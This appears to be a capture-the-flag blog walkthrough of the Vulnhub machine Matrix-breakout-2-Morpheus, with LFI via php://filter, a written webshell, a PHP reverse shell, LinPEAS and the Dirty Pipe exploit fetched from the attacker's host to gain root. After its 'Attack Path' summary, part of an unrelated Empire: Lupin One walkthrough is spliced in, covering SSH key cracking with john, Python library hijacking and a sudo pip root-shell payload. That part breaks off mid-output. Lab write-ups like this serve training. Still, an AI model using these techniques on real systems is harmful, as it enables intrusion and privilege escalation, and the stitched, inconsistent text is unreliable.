# Vulnhub Matrix-breakout-2-Morpheus


Vulnhub Training Walkthrough -- Matrix-breakout-2-Morpheus

<!--more-->

## Knowledge

- LFI -- Local File Include
- LinPEAS -- 
- Dirty-Pipe CVE-2022-0847
- php://filter

## 1. Environment Setup

Download the [OVA file](https://download.vulnhub.com/matrix-breakout/matrix-breakout-2-morpheus.ova), import into VMware and just run.

## 2. Reconnaisence

### 1. IP Address

arp-scan scanner:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ sudo arp-scan -l
[sudo] password for v4ler1an:
Interface: eth0, type: EN10MB, MAC: 00:0c:29:9d:5b:9e, IPv4: 172.16.86.138
WARNING: Cannot open MAC/Vendor file ieee-oui.txt: Permission denied
WARNING: Cannot open MAC/Vendor file mac-vendor.txt: Permission denied
Starting arp-scan 1.10.0 with 256 hosts (https://github.com/royhills/arp-scan)
172.16.86.1	5e:52:30:c9:b7:65	(Unknown: locally administered)
172.16.86.2	00:50:56:fd:f8:ec	(Unknown)
172.16.86.153	00:0c:29:f6:3b:cd	(Unknown)
172.16.86.254	00:50:56:ed:8a:52	(Unknown)

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.10.0: 256 hosts scanned in 2.250 seconds (113.78 hosts/sec). 4 responded
```

Target IP is 172.16.86.152.

### 2. Port Info

Scan the port and service:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ nmap -T4 -p- -sC -sV -sT -A -Pn 172.16.86.153
Starting Nmap 7.94SVN ( https://nmap.org ) at 2023-11-14 21:14 EST
Nmap scan report for 172.16.86.153
Host is up (0.00033s latency).
Not shown: 65532 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.4p1 Debian 5 (protocol 2.0)
| ssh-hostkey:
|_  256 aa:83:c3:51:78:61:70:e5:b7:46:9f:07:c4:ba:31:e4 (ECDSA)
80/tcp open  http    Apache httpd 2.4.51 ((Debian))
|_http-server-header: Apache/2.4.51 (Debian)
|_http-title: Morpheus:1
81/tcp open  http    nginx 1.18.0
|_http-server-header: nginx/1.18.0
| http-auth:
| HTTP/1.1 401 Unauthorized\x0D
|_  Basic realm=Meeting Place
|_http-title: 401 Authorization Required
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 12.33 seconds
```

Port and service:

| port | service             |
| ---- | ------------------- |
| 22   | ssh                 |
| 80   | Apache httpd 2.4.51 |
| 81   | nginx 1.18.0        |

Access the 80 webpage:

![image-20231115102052270](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151020427.png)

The source of page is:

```shell
<html>
	<head><title>Morpheus:1</title></head>
	<body>
		Welcome to the Boot2Root CTF, Morpheus:1.
		<p>
		You play Trinity, trying to investigate a computer on the 
		Nebuchadnezzar that Cypher has locked everyone else out of, at least for ssh.
		<p>
		Good luck!

		- @jaybeale from @inguardians
		<p>
		<img src="trinity.jpeg">
	</body>
</html>

```

The picture is normal.

Access the 81 port:

![image-20231115102156307](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151021400.png)

Has a login page, but we have no name and password. The username maybe is `Trinity` or `Cypher`.

### 3. Web Directory

Scan the web directory:

```shell
┌──(v4ler1an㉿kali)-[~]
└─$ gobuster dir -u http://172.16.86.153 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt  -x php,bak,txt,html -t 60
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://172.16.86.153
[+] Method:                  GET
[+] Threads:                 60
[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              php,bak,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 278]
/index.html           (Status: 200) [Size: 348]
/.html                (Status: 403) [Size: 278]
/javascript           (Status: 301) [Size: 319] [--> http://172.16.86.153/javascript/]
/robots.txt           (Status: 200) [Size: 47]
/graffiti.txt         (Status: 200) [Size: 139]
/graffiti.php         (Status: 200) [Size: 451]
/.html                (Status: 403) [Size: 278]
/.php                 (Status: 403) [Size: 278]
/server-status        (Status: 403) [Size: 278]
Progress: 1102800 / 1102805 (100.00%)
===============================================================
Finished
===============================================================
```

We can find `robots.txt`, `graffiti.txt` and `graffiti.php` file, just look at it.

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.153/robots.txt
There's no white rabbit here.  Keep searching!
                                                                              
┌──(v4ler1an㉿kali)-[~/Documents/tmp]
└─$ curl http://172.16.86.153/graffiti.txt
Mouse here - welcome to the Nebby!

Make sure not to tell Morpheus about this graffiti wall.
It's just here to let us blow off some steam.

```

![image-20231115142554473](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151425610.png)

We found a message input box.

## 3. Exploit

Now, let's test `graffiti.php` with burp:

![image-20231115142725188](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151427316.png)

As we can see, when we text in message box, the server will return the `graffiti.txt` file, and what we input in message box will be accour here. So, here has a LFI vulnerability.

### 1. LFI

We can check out the `graffiti.php ` source code with php:filter through the LFI:

![image-20231115143317154](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151433288.png)

Decode with base64 and then got the source code:

```shell
<?php

$file="graffiti.txt";
if($_SERVER['REQUEST_METHOD'] == 'POST') {
    if (isset($_POST['file'])) {
       $file=$_POST['file'];
    }
    if (isset($_POST['message'])) {
        $handle = fopen($file, 'a+') or die('Cannot open file: ' . $file);
        fwrite($handle, $_POST['message']);
	fwrite($handle, "\n");
        fclose($file); 
    }
}

// Display file
$handle = fopen($file,"r");
while (!feof($handle)) {
  echo fgets($handle);
  echo "<br>\n";
}
fclose($handle);
?>
```

We fill the `file` parameter with `php://filter/read=convert.base64-encode/resource=graffiti.php`, and we got the source code of `graffiti.php`.

### 2. Upload the webshell

In the source code of `graffiti.php`, we can find that the `$file` variable with replaced with the POST's parameter `file`, and then write the `message` we inputed into the `file`. So, we can use it write a webshell here:

![image-20231115144010659](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151440825.png)

And then connect it with AntSword:

![image-20231115144659387](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151446555.png)

### 3. Get the reverse shell

And then we user a php reverse shell to get shell:

![image-20231115150726321](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151507489.png)

And then switch the shell by python:

```shell
$ python3 -c 'import pty;pty.spawn("/bin/bash")';
www-data@morpheus:/$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@morpheus:/$ ls
ls
FLAG.txt  boot	dev  home  lib32  libx32      media  opt   root  sbin  sys  usr
bin	  crew	etc  lib   lib64  lost+found  mnt    proc  run	 srv   tmp  var
www-data@morpheus:/$ cat FLAG.txt
cat FLAG.txt
Flag 1!

You've gotten onto the system.  Now why has Cypher locked everyone out of it?

Can you find a way to get Cypher's password? It seems like he gave it to
Agent Smith, so Smith could figure out where to meet him.

Also, pull this image from the webserver on port 80 to get a flag.

/.cypher-neo.png
```

## 4. Privilege Escalation

Now, we need to get root. We can find two user in home:

```shell
www-data@morpheus:/$ ls /home
ls /home
cypher	trinity
www-data@morpheus:/$ find / -user cypher -type f 2>/dev/null
find / -user cypher -type f 2>/dev/null
/FLAG.txt
www-data@morpheus:/$ find / -user trinity -type f 2>/dev/null
find / -user trinity -type f 2>/dev/null
/home/trinity/.bash_logout
/home/trinity/.bashrc
/home/trinity/.profile
```

Nothing useful. Let's use LinPEAS:

```shell
www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/LinPEAS.sh
wget http://172.16.86.138:8080/LinPEAS.sh
--2023-11-15 06:35:55--  http://172.16.86.138:8080/LinPEAS.sh
Connecting to 172.16.86.138:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 847815 (828K) [text/x-sh]
Saving to: ‘LinPEAS.sh’

LinPEAS.sh          100%[===================>] 827.94K  --.-KB/s    in 0.04s

2023-11-15 06:35:55 (22.5 MB/s) - ‘LinPEAS.sh’ saved [847815/847815]

www-data@morpheus:/var/www/html$ ls
ls
LinPEAS.sh    graffiti.txt  php_reverse_shell.php  shell.php
graffiti.php  index.html    robots.txt		   trinity.jpeg
www-data@morpheus:/var/www/html$ ls -la
ls -la
total 1284
drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:35 .
drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
-rw-rw-rw- 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
www-data@morpheus:/var/www/html$ chmod +x LinPEAS.sh
chmod +x LinPEAS.sh

```

We can find something useful:

![image-20231115155130030](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311151551250.png)

We can use Dirty-Pipe to get root. The [exploit](https://github.com/imfiver/CVE-2022-0847). Download it and then execute:

```shell
www-data@morpheus:/var/www/html$ wget http://172.16.86.138:8080/dirty_pipe.sh
wget http://172.16.86.138:8080/dirty_pipe.sh
--2023-11-15 06:47:08--  http://172.16.86.138:8080/dirty_pipe.sh
Connecting to 172.16.86.138:8080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 4855 (4.7K) [text/x-sh]
Saving to: ‘dirty_pipe.sh’

dirty_pipe.sh       100%[===================>]   4.74K  --.-KB/s    in 0s

2023-11-15 06:47:08 (489 MB/s) - ‘dirty_pipe.sh’ saved [4855/4855]

www-data@morpheus:/var/www/html$ ls -la
ls -la
total 1292
drwxr-xr-x 2 www-data www-data   4096 Nov 15 06:47 .
drwxr-xr-x 3 root     root       4096 Oct 28  2021 ..
-rw-r--r-- 1 www-data www-data 381359 Oct 28  2021 .cypher-neo.png
-rwxrwxrwx 1 www-data www-data 847815 Nov 15  2023 LinPEAS.sh
-rw-rw-rw- 1 www-data www-data   4855 Nov 15 03:32 dirty_pipe.sh
-rw-r--r-- 1 www-data www-data    778 Nov 15 05:34 graffiti.php
-rw-r--r-- 1 www-data www-data    181 Nov 15 05:29 graffiti.txt
-rw-r--r-- 1 www-data www-data    348 Oct 28  2021 index.html
-rw-r--r-- 1 www-data www-data   5495 Nov 15  2023 php_reverse_shell.php
-rw-r--r-- 1 www-data www-data     47 Oct 28  2021 robots.txt
-rw-r--r-- 1 www-data www-data     31 Nov 15 05:41 shell.php
-rw-r--r-- 1 www-data www-data  44297 Oct 28  2021 trinity.jpeg
www-data@morpheus:/var/www/html$ chmod +x dirty_pipe.sh
chmod +x dirty_pipe.sh
www-data@morpheus:/var/www/html$ ./dirty_pipe.sh
./dirty_pipe.sh
/etc/passwd已备份到/tmp/passwd
It worked!

# 恢复原来的密码
rm -rf /etc/passwd
mv /tmp/passwd /etc/passwd
root@morpheus:/var/www/html# id
id
uid=0(root) gid=0(root) groups=0(root)
root@morpheus:/var/www/html# ls /root
ls /root
FLAG.txt
root@morpheus:/var/www/html# cat /root/FLAG.txt
cat /root/FLAG.txt
You've won!

Let's hope Matrix: Resurrections rocks!
```

## Attack Path

scann web directory --> analysis php file --> LFI --> upload webshell --> get revers shell --> privilege escalation

### 2. unpasswd the ssh private key 

Well, the key file has passphase, we need to unlock it.

It's like has been encoded, check it:

![image-20231113165107375](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131651529.png)

It is encoded by base58, so decode it:

![image-20231113165201242](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131652389.png)

We got the private key file. And then broute force it with john:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ python ssh2join.py hash>hash1

┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ cat hash1
hash:$sshng$2$16$f2df77361693c16003677b8a33deeb06$2486$6f70656e7373682d6b65792d7631000000000a6165733235362d636263000000066263727970740000001800000010f2df77361693c16003677b8a33deeb06000000100000000100000217000000077373682d727361000000030100010000020100c1cc78f325cbe4f465e2cada65813f73fe63fdd4da8e53d428030a29e493718447e6fe3e4a426763fc907bb10d61068b4e36fa9a01d9ac2be3982fd1fa3526f48cc6cc738b2816b0629e82c4931f3de01fcfa944ce0deb0c115fda2b6d9429e81dc2527d02b7fed58e3c57cea09334bac73a0a9ff131564029b1d8a6211bc686cbf864c98c6449132284c41b3eeb683ed01c31178aeb16974864877deb4190ab16c6454fb274c0a80bad7da99a83100baa38d8e40968d2c1cd3c4263a8d4d810d0102a15b913cbede25ad3f9d17c268eac8ccf7d9fcd35882efc395fd4299b5c4b02566943ef571b3eac1f58a19fde159e12bd16750844b937f93b20c80b051b83474b88acf891cb2461c0f31f4667683b268e862fdae2d52e2d7d8eb7e7a7fb55a0b6ca9b7f489a657a26e6e3e899a91d77b07b02a2bfacf59cd13c9a41cca58e4885ed1c2ddcafdf5e9b148f0efb7cb99b780f22151493bf02e67d1550e3d240cb31e7a77e07d1f66c5888da5a35f264c56b06b4a5f5dd701557664a2e5f79e5641d7f5e88a9ef52c7de43c8ed4edf3eccf91321483d621a10db119b39dbb58f5a8d085b8c70231429408735c98b82c667a9a368612297ef60e14ee98ed100a98bf5fb7c7c17ecee899b1574caffeba31ae1eea2c0f2ea9adceddd488519be087b5c5a5907fb527968294ca32ef33005b6f781161a9016d0029a0e3611a8610000075064b8515cb4008dae50f1375f34bdccea9975ecfa87dd1520e27a23612822dd4aa143b1200b69790b5fc0c50e9158db7eaa404d69a02f8b26c3c72584a964eaf47068ed5a932431c067cc3f6eca70a3859f628da3d8fef318ee6b4764d098f127a8580c585d3a0acb672effea55c8643be8a62ddc9d004fbc00d8e47768c324d28d4ba28ceecaf3ab07771730787be7305f810c8079e0fb2f2606fdbef3eb31af57165c6bf839ef6097c5749795b40ec3f011f00ae100fe1225136416857661109edfc5a1404a7847a93edf8b4afa452811a5406f053e21c858c8cf196ab4af1d5a44bc550f8803521c267f6fea5d290b41cd3939fd51ff264dd03dc1faf44272c7cfe0444fe095063acfa9c2eaea06e0090897e80ec59d2158926fd11d5282b73dd66055718c26b943c5441e5814c1c359b62667422f719b54c51b12936fee583599716e2d0ec90454f7edaea137e9fb66f5e27f9d60ec66837165b8e8e1c178e0f4c5d1653a53452c256ea60dc943928e974a308ae2d93cbebe2a401f0e2c140c6db08e11538e3a6f6bbbcf5ed5af8508a8443cfe8b7f0a0118264c92a74ea9499ab2dbc27949a1b7a6b5cfa9d74e2ce89a6672c7e96d83d73dc5f78ef2d835c5ab027a5d4196e22150ac060e42c278812c0f51d80c15dbf878e61dfc33462a67fed2ee34f2cd8c69f1f4ba5577b33bd858e4ea5972f0a5062fbcfde4702dc264a0a8846537e33988a941e4255a7ead33e7d541f2f6fda0c5069020b955045f2a5cef2a73e4d007bd4323d4cc00f2fa00ae4361e64a4253c4ce8ac68654a4309fbe7d3c4f1b74767ec29d3ac53c621c4ce70d8b6c731aedf00bb8e966f92771937ea91074b9c77abdf274e26713d37539a2afbebb25f1f2de8428449ae0b5dc70f18d8697e19c4720be2e9004c0604353e1d094a7501ee38eb923a82d6af2a44db847161f21e0b5cef9270128e5178b755fe164158f0fc65e7e6f14cad14349a804078d048fd8db0f91a81cc3c1c7c54938b850fb8ff1b9a6a2ac2eecf4e717e160d9797dc4d058cff64ab7404607cdc8b1cd70a99392a7566c4fba5eef362790da0a818ed47d040dcfa825cf7881f43965d813e2d19c6df95ba99eaaa401c3c8123f09f8f589585b7c31bf51b7ab1a9a6a81b6dc74f777129cb2ca7e5ea99200b689233625a671f90a66a8e1e050e23bfbab129186ca6501b6cbdbbe34797b6b864dc021689ac358740d15eb9b61a4bdbbc011ec31dec5c4b4f9cc1b8615c950057e0237ecc503adc2cef77a156f8a7fac71eaa8f34c3703359ecf9a745ed1123cc5c2be3fb6b66ad17164ae909ee5f0581f9f18c9f3bf83cba9dc3331712488eb746a49b93ad19de2622c01f22420a2bb599b452c41bccb8fd8b5ca2290e8e7a44506841b1ba22140354af66840ef4d9d3a34495cbb987cf31b5ee72b894c257a93c65d3cab6e8ecef76a7af317f5bdc600155a1fb7ec631a1717b783b114b1f37a63adc49dfadd3eb7f618850febdb3df461fab02dab3b96da09a2d4dc98fa88236f09a57fe796990431cb97a0b0f32ef099391a3b01877c250aed836032b3ca471b29f29453034e7d7780f25360984b0cee07f7eedd672f36e6691f2a76213e78a8294160a892b6cacc106913cb6a41d4caf88d5eab71caa29ce6a610326945d4cf9f4a31311187d76c8701859ee05d8c1a9465fbb97f2f93cccee5d87d5bd49b3b82f1948f274af7b31892560465d90194a22e4095a74f0f78ac6628dd92d53cf1aa85bb54e9c8de306f283dc8a505d2b1b4e0cf9581d3b0549946f1097975358cd71cf1003fde4893c70c07c30ec857049530fc057251057d88eb31ce87ee106b8fa8564f5996e2c1c5ebb6dab5601bb9794c77233bb2f862e6e25ee1363fbbbbee86d651f7a5b42f304348c0ad68b6eb1fc852dfc53fc36af7ae290fb9bf74f1d013cfe8878575353196ac3b0adc06cb93f32b81139283b21ce014bff08c1156e0be776c353eaf97fb33246e51290f8f48bae21acc9047937b3a4b25948497c3eaee02dcdf330b725e6e5ea2c5e54cdaf109599d9585ccbedf5a8ff343bff8a93d35459a96ccfee8ab76cae7815cdd4b2c524d45532f54ef36debcd554e636c97c3c01564a3aa0d1ce0bc19350079d2eebde57c758487947236188420a67ec034ae38a7a7a9cef519fbe0995394ca9613b68239dbb7e217ff6b4b73101f667797ea96330e40d4f53604290cb28d3ad0e204f4fe4a7c5ddab716e20158a2ea829f067461a8cdace12a560d977cc4f69f92d04f32037ded3ccb58cea98b43604be7c9b493e90d12fcbd31af1421c7562e1281307ae3e1d3007e77b900b9aa2ce3e6ddfc8a7dcb096b4f131195dde88a6f1b8cc6d0c6c3048b4ff0ca71941be74b10b095312a4b8cc9fbc3402f70ca16271f4ff89bd6a181a4f0cd015fc9fec36d3334fac5caae54d874c6063598ad29ea81d5bb14d87a43821dc7bae74855bb571bbe2765a2cf4debd2ad929200e8adf90cfa336640b89279b3b50496aacb96247614037e8011029b646acc1dc7ba3f26337f518ad446b4885e8e9b16ac391b4b35473214c4cf8b48c0780a934d414c3df8af279e97fe0e465b0289427ae9699150df44a15964782cd02708af2$16$614

┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ john hash1 --wordlist=/usr/share/wordlists/fasttrack.txt
Using default input encoding: UTF-8
Loaded 1 password hash (SSH, SSH private key [RSA/DSA/EC/OPENSSH 32/64])
Cost 1 (KDF/cipher [0=MD5/AES 1=MD5/3DES 2=Bcrypt/AES]) is 2 for all loaded hashes
Cost 2 (iteration count) is 16 for all loaded hashes
Press 'q' or Ctrl-C to abort, almost any other key for status
P@55w0rd!        (hash)
1g 0:00:00:04 DONE (2023-11-13 03:57) 0.2283g/s 9.817p/s 9.817c/s 9.817C/s P@55w0rd!
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```

Now, we can login ssh with user icex64 and private key:

```shell
┌──(v4ler1an㉿kali)-[~/Documents/tools/crack]
└─$ ssh icex64@172.16.86.148 -i hash
Enter passphrase for key 'hash':
Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64
########################################
Welcome to Empire: Lupin One
########################################
Last login: Thu Oct  7 05:41:43 2021 from 192.168.26.4
icex64@LupinOne:~$ id
uid=1001(icex64) gid=1001(icex64) groups=1001(icex64)
```

## 4. Privilege Escalation

Now, we need to get root privilege.

### 1. First method - Dirty_PIPE

We found that the target has gcc, and kenel version is 5.10.0, so we can use dirty_pipe vulnerability to get root:

```shell
icex64@LupinOne:~$ (uname -a || cat /proc/version) 2>/dev/null
Linux LupinOne 5.10.0-8-amd64 #1 SMP Debian 5.10.46-5 (2021-09-23) x86_64 GNU/Linux
icex64@LupinOne:~$ gcc --version
gcc (Debian 10.2.1-6) 10.2.1 20210110
Copyright (C) 2020 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.  There is NO
warranty; not even for MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.
icex64@LupinOne:~$ ./checker.sh
5 10 0
Vulnerable
icex64@LupinOne:~$ cat checker.sh
#!/bin/bash
# usage
# Check current kernel ./dpipe.sh
# Check specific kernel ./dpipe.sh 5.10.102

kernel=$1
ver1=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f1)
ver2=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f2)
ver3=$(echo ${kernel:-$(uname -r | cut -d '-' -f1)} | cut -d '.' -f3)
echo $ver1 $ver2 $ver3

if (( ${ver1:-0} < 5 )) ||
   (( ${ver1:-0} > 5 )) ||
   (( ${ver1:-0} == 5 && ${ver2:-0} < 8 )) ||
   (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 102 )) ||
   (( ${ver1:-0} == 5 && ${ver2:-0} == 10 && ${ver3:-0} == 92 )) ||
   (( ${ver1:-0} == 5 && ${ver2:-0} == 15 && ${ver3:-0} == 25 )) ||
   (( ${ver1:-0} == 5 && ${ver2:-0} >= 16 && ${ver3:-0} >= 11 )) ||
   (( ${ver1:-0} == 5 && ${ver2:-0} > 16 ));
then
    echo Not vulnerable
    exit 0
else
    echo Vulnerable
    exit 1
fi
icex64@LupinOne:~$ ./a.out
Backing up /etc/passwd to /tmp/passwd.bak ...
Setting root password to "aaron"...
system() function call seems to have failed :(
icex64@LupinOne:~$ su
Password:
# id
uid=0(root) gid=0(root) groups=0(root)
# ls
a.out  checker.sh  dirty_pipe.c  user.txt
# ls /root
root.txt
# cat /root/root.txt
*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,                       .&&&&&&&&&(            /&&&&&&&&&
,                    &&&&&&*                          @&&&&&&
,                *&&&&&                                   &&&&&&
,              &&&&&                                         &&&&&.
,            &&&&                   ./#%@@&#,                   &&&&*
,          &%&&          &&&&&&&&&&&**,**/&&(&&&&&&&&             &&&&
,        &@(&        &&&&&&&&&&&&&&&.....,&&*&&&&&&&&&&             &&&&
,      .& &          &&&&&&&&&&&&&&&      &&.&&&&&&&&&&               &%&
,     @& &           &&&&&&&&&&&&&&&      && &&&&&&&&&&                @&&&
,    &%((            &&&&&&&&&&&&&&&      && &&&&&&&&&&                 #&&&
,   &#/*             &&&&&&&&&&&&&&&      && #&&&&&&&&&(                 (&&&
,  %@ &              &&&&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/
,  & &               &&&&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &
, & &                &&&&&&&&&&&&&&&,     &&& &&&&&&&&&&(                   &,@
,.& #                #&&&&&&&&&&&&&&(     &&&.&&&&&&&&&&&                   & &
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
*& *              &&&&&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
*&              &&&&&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
*% .           &&&&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
*& *            &&&&&&&&&&   /*      @%&%&&&&&&&&    &&&&,                   @ &
*& &               &&&&&&&           & &&&&&&&&&&     @&&&                   & &
*& &                    &&&&&        /   /&&&&         &&&                   & @
*/(,                      &&                            &                   / &.
* & &                     &&&       #             &&&&&&      @             & &.
* .% &                    &&&%&     &    @&&&&&&&&&.   %@&&*               ( @,
/  & %                   .&&&&  &@ @                 &/                    @ &
*   & @                  &&&&&&    &&.               ,                    & &
*    & &               &&&&&&&&&& &    &&&(          &                   & &
,     & %           &&&&&&&&&&&&&&&(       .&&&&&&&  &                  & &
,      & .. &&&&&&&&&&&&&&&&&&&&&&&&&&&&*          &  &                & &
,       #& & &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&        &.             %  &
,         &  , &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.     &&&&          @ &*
,           & ,, &&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&.  /&&&&&&&&    & &@
,             &  & #&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&&&&&&@ &. &&
,               && /# /&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&# &&&# &# #&
,                  &&  &( .&&&&&&&&&&&&&&&&&&&&&&&&&&&  &&  &&
/                     ,&&(  &&%   *&&&&&&&&&&%   .&&&  /&&,
,                           &&&&&/...         .#&&&&#

3mp!r3{congratulations_you_manage_to_pwn_the_lupin1_box}
See you on the next heist.
```

Thsi way is easy, but maybe cause the kernel crash, or root can not login.

### 2. Second method - LinPEAS

Download and execute LinPEAS.sh:

![image-20231113174315301](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131743561.png)

And we can see some exploit suggester:

![image-20231113174414155](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131744400.png)

![image-20231113174437529](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131744767.png)

And we can see user icex64's privilege info:

![image-20231113174549032](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131745283.png)

And we found some writable files:

![image-20231113174704337](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131747592.png)

As we know, the file `/home/arsene/heist.py` content like follow:

```shell
icex64@LupinOne:~$ cat /home/arsene/heist.py
import webbrowser

print ("Its not yet ready to get in action")

webbrowser.open("https://empirecybersecurity.co.mz")
```

and the file webbrowser.py is writable. So, we can change the `/usr/lib/python3.9/webbrowser.py` file to achive the root.

Modify the file `/usr/lib/python3.9/webbrowser.py` as follows, add some payload:

![image-20231113175900550](https://raw.githubusercontent.com/AlexsanderShaw/BlogImages/main/img/2023/202311131759811.png)

And then execute the heist.py file:

```shell
icex64@LupinOne:~$ sudo -u arsene /usr/bin/python3.9 /home/arsene/heist.py
arsene@LupinOne:/home/icex64$ id
uid=1000(arsene) gid=1000(arsene) groups=1000(arsene),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)
arsene@LupinOne:/home/icex64$ cd /home/arsene/
arsene@LupinOne:~$ ls
heist.py  note.txt
arsene@LupinOne:~$ cat note.txt
Hi my friend Icex64,

Can you please help check if my code is secure to run, I need to use for my next heist.

I dont want to anyone else get inside it, because it can compromise my account and find my secret file.

Only you have access to my program, because I know that your account is secure.

See you on the other side.

Arsene Lupin.
```

Well, how we can get root? Condiser the `sudo -l`:

```shell
arsene@LupinOne:~$ sudo -l
Matching Defaults entries for arsene on LupinOne:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User arsene may run the following commands on LupinOne:
    (root) NOPASSWD: /usr/bin/pip
```

The pip application has root privilege, so we can use it:

```shell
arsene@LupinOne:~$ TF=$(mktemp -d)
echo "import os; os.execl('/bin/sh', 'sh', '-c', 'sh <$(tty) >$(tty) 2>$(tty)')" > $TF/setup.py
sudo pip install $TF
Processing /tmp/tmp.e43H2KlJDL
# id
uid=0(root) gid=0(root) groups=0(root)
# ls /root
root.txt
# cat /root/root.txt
*,,,,,,,,,,,,,,,,,,,,,,,,,,,,,(((((((((((((((((((((,,,,,,,,,,,,,,,,,,,,,,,,,,,,,
,                       .&&&&&&&&&(            /&&&&&&&&&
,                    &&&&&&*                          @&&&&&&
,                *&&&&&                                   &&&&&&
,              &&&&&                                         &&&&&.
,            &&&&                   ./#%@@&#,                   &&&&*
,          &%&&          &&&&&&&&&&&**,**/&&(&&&&&&&&             &&&&
,        &@(&        &&&&&&&&&&&&&&&.....,&&*&&&&&&&&&&             &&&&
,      .& &          &&&&&&&&&&&&&&&      &&.&&&&&&&&&&               &%&
,     @& &           &&&&&&&&&&&&&&&      && &&&&&&&&&&                @&&&
,    &%((            &&&&&&&&&&&&&&&      && &&&&&&&&&&                 #&&&
,   &#/*             &&&&&&&&&&&&&&&      && #&&&&&&&&&(                 (&&&
,  %@ &              &&&&&&&&&&&&&&&      && ,&&&&&&&&&&                  /*&/
,  & &               &&&&&&&&&&&&&&&      &&* &&&&&&&&&&                   & &
, & &                &&&&&&&&&&&&&&&,     &&& &&&&&&&&&&(                   &,@
,.& #                #&&&&&&&&&&&&&&(     &&&.&&&&&&&&&&&                   & &
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&             &(&
*& &                 ,&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&&            & &
*& *              &&&&&&&&&&&&&&&&&&&@.                 &&&&&&&&             @ &
*&              &&&&&&&&&&&&&&&&&&@    &&&&&/          &&&&&&                & &
*% .           &&&&&&&&&&&@&&&&&&&   &  &&(  #&&&&   &&&&.                   % &
